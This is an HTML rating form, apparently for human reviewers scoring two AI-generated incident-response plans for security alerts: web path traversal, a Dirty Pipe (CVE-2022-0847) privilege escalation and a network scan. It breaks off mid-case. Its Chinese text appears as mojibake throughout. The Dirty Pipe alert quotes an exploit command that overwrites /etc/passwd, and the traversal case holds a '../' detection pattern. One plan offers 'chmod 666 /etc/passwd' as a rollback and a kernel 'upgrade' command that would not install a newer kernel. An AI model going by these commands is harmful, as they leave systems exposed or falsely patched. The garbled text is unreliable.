   æè¿°: å¯¹Webè®¿é—®æ—¥å¿—ä¸­å‡ºç°'../'ç­‰å¯ç–‘è·¯å¾„è¡Œä¸ºè¿›è¡Œå®æ—¶ç›‘æ§å’Œè‡ªåŠ¨å‘Šè­¦
   æ‰§è¡Œå‘½ä»¤(Linux): grep '\.\./' /var/log/nginx/access.log | tee -a /var/log/web_traversal_alert.log
   Pre-check: ç¡®è®¤æ—¥å¿—è·¯å¾„å’Œæ ¼å¼ä¸å®é™…WebæœåŠ¡å™¨é…ç½®ä¸€è‡´</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(3)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(3)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-4">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #4: Case12_DirtyPipeææƒ</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘Linuxæœ¬åœ°ææƒæ”»å‡»
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 15:30:00
ã€å—å½±å“ä¸»æœºã€‘192.168.5.100
ã€å½“å‰ç”¨æˆ·ã€‘www-data
ã€å¨èƒç­‰çº§ã€‘ä¸¥é‡
ã€æ”»å‡»ç±»å‹ã€‘æƒé™æå‡
ã€æ¼æ´ç±»å‹ã€‘CVE-2022-0847
ã€ATT&amp;CKã€‘æƒé™æå‡:TA0004|åˆ©ç”¨æ¼æ´ææƒ:T1068
ã€å¯ç–‘è¿›ç¨‹ã€‘/tmp/.exploit_dp
ã€å¯ç–‘å‘½ä»¤ã€‘./exploit_dp /etc/passwd 1 ootz:
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°Dirty Pipeæ¼æ´åˆ©ç”¨å°è¯•ï¼Œä½æƒé™ç”¨æˆ·www-dataæ­£åœ¨å°è¯•é€šè¿‡CVE-2022-0847è¦†å†™/etc/passwdæ–‡ä»¶ä»¥è·å–rootæƒé™ã€‚
ã€å¤„ç½®å»ºè®®ã€‘ç«‹å³ç»ˆæ­¢æ¶æ„è¿›ç¨‹ï¼Œå‡çº§å†…æ ¸åˆ°5.16.11+ï¼Œæ£€æŸ¥/etc/passwdæ˜¯å¦è¢«ç¯¡æ”¹</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>## äº‹ä»¶æè¿°
åœ¨2025-12-04 15:30:00ï¼Œå—å½±å“ä¸»æœº192.168.5.100ä¸Šçš„ä½æƒé™ç”¨æˆ·www-dataå°è¯•é€šè¿‡Dirty Pipeæ¼æ´ï¼ˆCVE-2022-0847ï¼‰å¯¹ç³»ç»Ÿè¿›è¡Œæœ¬åœ°æƒé™æå‡æ”»å‡»ã€‚æ”»å‡»è€…åˆ©ç”¨/tmp/.exploit_dpæ¶æ„è¿›ç¨‹ï¼Œæ‰§è¡Œå¯ç–‘å‘½ä»¤ï¼Œè¯•å›¾è¦†å†™/etc/passwdæ–‡ä»¶ä»¥æ·»åŠ å…·æœ‰rootæƒé™çš„è´¦æˆ·ã€‚

## æ”»å‡»åˆ†ç±»
æœ¬åœ°ææƒæ”»å‡»ï¼ˆPrivilege Escalationï¼‰ï¼Œå±äºåˆ©ç”¨å·²çŸ¥æ“ä½œç³»ç»Ÿå†…æ ¸æ¼æ´ï¼ˆCVE-2022-0847ï¼ŒDirty Pipeï¼‰çš„æ¼æ´åˆ©ç”¨æ”»å‡»ã€‚

## é£é™©è¯„ä¼°
é£é™©ç­‰çº§ï¼šé«˜  
ç†ç”±ï¼šDirty Pipeæ¼æ´å¯è¢«éç‰¹æƒç”¨æˆ·åˆ©ç”¨ç›´æ¥è¦†å†™ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚/etc/passwdï¼‰ï¼Œä¸€æ—¦æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…å¯è·å–rootæƒé™ï¼Œå®Œå…¨æ§åˆ¶ç›®æ ‡ä¸»æœºã€‚

## å¤„ç½®å»ºè®®

### 1. å³æ—¶ç¼“è§£æªæ–½
- ç«‹å³éš”ç¦»æˆ–æ–­ç½‘å—å½±å“ä¸»æœº192.168.5.100
- ç»ˆæ­¢å¯ç–‘è¿›ç¨‹ï¼škill -9 `pidof /tmp/.exploit_dp`
- æ£€æŸ¥å¹¶ä¿®å¤/etc/passwdã€/etc/shadowç­‰æ•æ„Ÿæ–‡ä»¶

### 2. æ ¹å› ä¿®å¤æ–¹æ¡ˆ
- å‡çº§Linuxå†…æ ¸åˆ°5.16.11æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œå½»åº•ä¿®å¤CVE-2022-0847æ¼æ´
- æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨å…¶ä»–å·²çŸ¥é«˜å±æ¼æ´å¹¶åŠæ—¶ä¿®è¡¥

### 3. é¢„é˜²åŠ å›ºæªæ–½
- å¯¹æ‰€æœ‰æœåŠ¡å™¨å®šæœŸæ‰§è¡Œæ¼æ´æ‰«æä¸è¡¥ä¸ç®¡ç†
- é™åˆ¶ä½æƒé™è´¦æˆ·ï¼ˆå¦‚www-dataï¼‰çš„shellè®¿é—®æƒé™
- é…ç½®ä¸»æœºå…¥ä¾µæ£€æµ‹ï¼ˆå¦‚AIDEã€OSSECï¼‰</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åˆ†ç±»ã€‘æƒé™æå‡
ã€é£é™©ç­‰çº§ã€‘ğŸŸ¡ MEDIUMï¼ˆè¯„åˆ†ï¼š0.52ï¼‰
ã€å¤„ç½®å†³ç­–ã€‘ğŸ“‹ å·²åˆ›å»ºå·¥å•ï¼Œç­‰å¾…äººå·¥å®¡æ ¸

ã€äº‹ä»¶æè¿°ã€‘
åœ¨2025å¹´12æœˆ4æ—¥ä¸‹åˆ3:30ï¼Œä½äº192.168.5.100çš„ä¸»æœºä¸Šæ£€æµ‹åˆ°ä¸€èµ·ä¸¥é‡çš„æƒé™æå‡æ”»å‡»ã€‚æ”»å‡»è€…åˆ©ç”¨CVE-2022-0847æ¼æ´ï¼Œå³è‘—åçš„Dirty Pipeæ¼æ´ï¼Œè¯•å›¾é€šè¿‡è¦†å†™/etc/passwdæ–‡ä»¶æ¥æå‡æƒé™ã€‚å½“å‰ç”¨æˆ·www-dataæ­£åœ¨æ‰§è¡Œä¸€ä¸ªåä¸º/tmp/.exploit_dpçš„å¯ç–‘è¿›ç¨‹ï¼Œå¹¶ä½¿ç”¨å¯ç–‘å‘½ä»¤./exploit_dp /etc/passwd 1 ootz:ï¼Œæ„å›¾è·å–rootæƒé™ã€‚

ã€é£æ§è¯„ä¼°ã€‘
R=0.52(medium): åŠ¨ä½œ0.50+èŒƒå›´0.80+ä¸šåŠ¡0.27 -&gt; ticket
æœ¬æ¬¡å‘Šè­¦è¢«åˆ¤å®šä¸ºä¸­ç­‰é£é™©ï¼ˆç»¼åˆé£é™©è¯„åˆ†ï¼š0.52ï¼‰ã€‚å·²åˆ›å»ºå·¥å•ï¼Œéœ€è¦å®‰å…¨åˆ†æå¸ˆäººå·¥å®¡æ ¸åå†³å®šå¤„ç½®æ–¹æ¡ˆã€‚

ã€å¤„ç½®Playbookã€‘ç½®ä¿¡åº¦: 0.97

â–  å³æ—¶ç¼“è§£æªæ–½
1. ç»ˆæ­¢æ¶æ„ææƒè¿›ç¨‹ [priority: critical]
   æè¿°: ç«‹å³ç»ˆæ­¢å¯ç–‘è¿›ç¨‹/tmp/.exploit_dpï¼Œé˜²æ­¢è¿›ä¸€æ­¥æƒé™æå‡å’ŒæŒä¹…åŒ–
   æ‰§è¡Œå‘½ä»¤(Linux): pkill -f '/tmp/.exploit_dp'
   æ‰§è¡Œå‘½ä»¤(Windows): taskkill /F /IM exploit_dp.exe
   å›é€€å‘½ä»¤(Linux): æ— ç›´æ¥å›é€€ï¼Œå¦‚è¯¯æ€éœ€é‡å¯è¢«å½±å“æœåŠ¡æˆ–è¿›ç¨‹
   å›é€€å‘½ä»¤(Windows): æ— ç›´æ¥å›é€€ï¼Œå¦‚è¯¯æ€éœ€é‡å¯è¢«å½±å“æœåŠ¡æˆ–è¿›ç¨‹
   Pre-check: ç¡®è®¤è¿›ç¨‹ç¡®å®ä¸ºæ¶æ„æˆ–æœªæˆæƒè¿›ç¨‹ï¼Œé¿å…è¯¯æ€æ­£å¸¸ä¸šåŠ¡è¿›ç¨‹

2. å¤‡ä»½å¹¶æ¢å¤/etc/passwdæ–‡ä»¶ [priority: critical]
   æè¿°: å¤‡ä»½å½“å‰/etc/passwdæ–‡ä»¶ï¼Œè‹¥å‘ç°è¢«ç¯¡æ”¹åˆ™ç”¨è¿‘æœŸå¤‡ä»½æ¢å¤ï¼Œé˜²æ­¢æ”»å‡»è€…å·²è·å¾—rootæƒé™
   æ‰§è¡Œå‘½ä»¤(Linux): cp /etc/passwd /tmp/passwd.bak &amp;&amp; cp /var/backups/passwd.bak /etc/passwd
   æ‰§è¡Œå‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   å›é€€å‘½ä»¤(Linux): cp /tmp/passwd.bak /etc/passwd
   å›é€€å‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   Pre-check: ç¡®è®¤/var/backups/passwd.bakä¸ºæœ€è¿‘ä¸”å¯ä¿¡å¤‡ä»½ï¼Œä¸”passwdæ–‡ä»¶ç¡®å®è¢«ç¯¡æ”¹

â–  æ ¹å› ä¿®å¤æ–¹æ¡ˆ
1. å‡çº§Linuxå†…æ ¸ä»¥ä¿®å¤Dirty Pipeæ¼æ´ [priority: critical]
   æè¿°: å°†å†…æ ¸å‡çº§åˆ°5.16.11æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œå½»åº•ä¿®å¤CVE-2022-0847æ¼æ´
   æ‰§è¡Œå‘½ä»¤(Linux): yum update kernel -y || apt-get install --only-upgrade linux-image-$(uname -r) -y &amp;&amp; reboot
   æ‰§è¡Œå‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   å›é€€å‘½ä»¤(Linux): grub2-set-default 0 &amp;&amp; rebootï¼ˆå›é€€åˆ°ä¸Šä¸€ä¸ªå†…æ ¸ç‰ˆæœ¬ï¼‰
   å›é€€å‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   Pre-check: ç¡®è®¤å½“å‰ä¸šåŠ¡å…è®¸é‡å¯ï¼Œå·²åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯å‡çº§å…¼å®¹æ€§

â–  é¢„é˜²åŠ å›ºæªæ–½
1. é™åˆ¶www-dataç”¨æˆ·çš„æ•æ„Ÿæ–‡ä»¶è®¿é—®æƒé™ [priority: high]
   æè¿°: æ”¶ç´§www-dataç”¨æˆ·å¯¹/etc/passwdç­‰æ•æ„Ÿæ–‡ä»¶çš„æƒé™ï¼Œå‡å°‘è¢«åˆ©ç”¨é£é™©
   æ‰§è¡Œå‘½ä»¤(Linux): chown root:root /etc/passwd &amp;&amp; chmod 644 /etc/passwd
   æ‰§è¡Œå‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   å›é€€å‘½ä»¤(Linux): chmod 666 /etc/passwdï¼ˆå¦‚éœ€æ¢å¤æ›´å®½æƒé™ï¼Œè°¨æ…æ“ä½œï¼‰
   å›é€€å‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   Pre-check: ç¡®è®¤åº”ç”¨å’ŒæœåŠ¡ä¸ä¾èµ–æ›´å®½æƒé™ï¼Œé¿å…ä¸šåŠ¡ä¸­æ–­

2. éƒ¨ç½²å…¥ä¾µæ£€æµ‹ä¸æ—¥å¿—ç›‘æ§ [priority: medium]
   æè¿°: é…ç½®auditdç­‰å·¥å…·å®æ—¶ç›‘æ§/etc/passwdåŠå¯ç–‘è¿›ç¨‹è¡Œä¸ºï¼ŒåŠæ—¶å‘ç°æœªæˆæƒæ“ä½œ
   æ‰§è¡Œå‘½ä»¤(Linux): auditctl -w /etc/passwd -p wa -k passwd_watch
   æ‰§è¡Œå‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   å›é€€å‘½ä»¤(Linux): auditctl -W /etc/passwd
   å›é€€å‘½ä»¤(Windows): æ— å¯¹åº”æ“ä½œ
   Pre-check: ç¡®è®¤auditdå·²å®‰è£…å¹¶æ­£å¸¸è¿è¡Œï¼Œé¿å…å¯¹ç³»ç»Ÿæ€§èƒ½é€ æˆè¿‡å¤§å½±å“</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(4)" >â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(4)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-5">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #5: Case17_æ¼æ´æ‰«æ</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘å¤§è§„æ¨¡æ¼æ´æ‰«ææ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 18:00:00
ã€æ”»å‡»æºIPã€‘185.220.100.250
ã€ç›®æ ‡ç½‘æ®µã€‘192.168.0.0/16
ã€æ‰«æç«¯å£ã€‘22,80,443,3306,6379,27017
ã€å¨èƒç­‰çº§ã€‘ä¸­å±
ã€æ”»å‡»ç±»å‹ã€‘æ¶æ„æ‰«æ
ã€ATT&amp;CKã€‘ä¾¦å¯Ÿ:TA0043|ä¸»åŠ¨æ‰«æ:T1595|æ¼æ´æ‰«æ:T1595.002
ã€æ‰«æç‰¹å¾ã€‘Nmap SYNæ‰«æï¼ŒUser-Agent: Mozilla/5.0 zgrab/0.x
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°æ¥è‡ª185.220.100.250çš„å¤§è§„æ¨¡ç«¯å£æ‰«æï¼Œç›®æ ‡è¦†ç›–æ•´ä¸ª192.168.0.0/16ç½‘æ®µï¼Œé‡ç‚¹æ¢æµ‹æ•°æ®åº“å’ŒWebæœåŠ¡ç«¯å£ã€‚
ã€å¤„ç½®å»ºè®®ã€‘åœ¨è¾¹ç•Œé˜²ç«å¢™å°ç¦æ‰«ææºIPï¼Œæ£€æŸ¥æš´éœ²çš„æœåŠ¡æ˜¯å¦å­˜åœ¨æ¼æ´</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>## äº‹ä»¶æè¿°
2025å¹´12æœˆ4æ—¥18:00ï¼Œæ£€æµ‹åˆ°æºIPä¸º185.220.100.250çš„ä¸»æœºé’ˆå¯¹å†…ç½‘192.168.0.0/16ç½‘æ®µå‘èµ·äº†å¤§è§„æ¨¡ç«¯å£æ‰«æã€‚æ‰«æå¯¹è±¡æ¶µç›–äº†å¸¸è§çš„è¿œç¨‹ç®¡ç†ç«¯å£ï¼ˆ22ï¼‰ã€WebæœåŠ¡ç«¯å£ï¼ˆ80ã€443ï¼‰åŠæ•°æ®åº“æœåŠ¡ç«¯å£ï¼ˆ3306ã€6379ã€27017ï¼‰ã€‚æ‰«æè¡Œä¸ºé‡‡ç”¨äº†Nmap SYNæ‰«ææŠ€æœ¯ï¼Œå¹¶æ£€æµ‹åˆ°User-Agentå­—æ®µä¸ºMozilla/5.0 zgrab/0.xï¼Œè¡¨æ˜æ”»å‡»è€…ä½¿ç”¨äº†è‡ªåŠ¨åŒ–å·¥å…·è¿›è¡Œæ¼æ´æ¢æµ‹ã€‚

## æ”»å‡»åˆ†ç±»
- æ”»å‡»ç±»å‹ï¼šä¸»åŠ¨ä¾¦å¯Ÿ/æ¼æ´æ‰«æï¼ˆReconnaissance / Vulnerability Scanningï¼‰
- ATT&amp;CKæ˜ å°„ï¼šä¾¦å¯Ÿï¼ˆTA0043ï¼‰ã€ä¸»åŠ¨æ‰«æï¼ˆT1595ï¼‰ã€æ¼æ´æ‰«æï¼ˆT1595.002ï¼‰

## é£é™©è¯„ä¼°
- é£é™©ç­‰çº§ï¼šä¸­å±
- ç†ç”±ï¼šè™½ç„¶å½“å‰å°šæœªå‘ç°åç»­åˆ©ç”¨è¡Œä¸ºï¼Œä½†å¤§è§„æ¨¡ã€è‡ªåŠ¨åŒ–çš„ç«¯å£å’Œæ¼æ´æ‰«æé€šå¸¸ä¸ºæ”»å‡»é“¾çš„å‰ç½®ç¯èŠ‚ã€‚

## å¤„ç½®å»ºè®®

1. **å³æ—¶ç¼“è§£æªæ–½**
   - ç«‹å³åœ¨è¾¹ç•Œé˜²ç«å¢™ã€IPS/IDSç­‰è®¾å¤‡ä¸Šå°ç¦æºIPï¼š185.220.100.250
   - æ£€æŸ¥é˜²ç«å¢™ã€è·¯ç”±å™¨ç­‰è¾¹ç•Œè®¾å¤‡æ—¥å¿—ï¼Œç¡®è®¤æ˜¯å¦æœ‰æ›´å¤šç±»ä¼¼æ‰«ææµé‡

2. **æ ¹å› ä¿®å¤æ–¹æ¡ˆ**
   - å¯¹è¢«æ‰«æç«¯å£çš„æœåŠ¡ï¼ˆSSHã€Webã€æ•°æ®åº“ç­‰ï¼‰è¿›è¡Œå…¨é¢å®‰å…¨åŠ å›º
   - æ£€æŸ¥æ‰€æœ‰é¢å‘å†…å¤–ç½‘çš„æœåŠ¡ï¼Œç¡®ä¿ä¸å­˜åœ¨é«˜å±æ¼æ´ã€å¼±å£ä»¤ã€é»˜è®¤è´¦æˆ·

3. **é¢„é˜²åŠ å›ºæªæ–½**
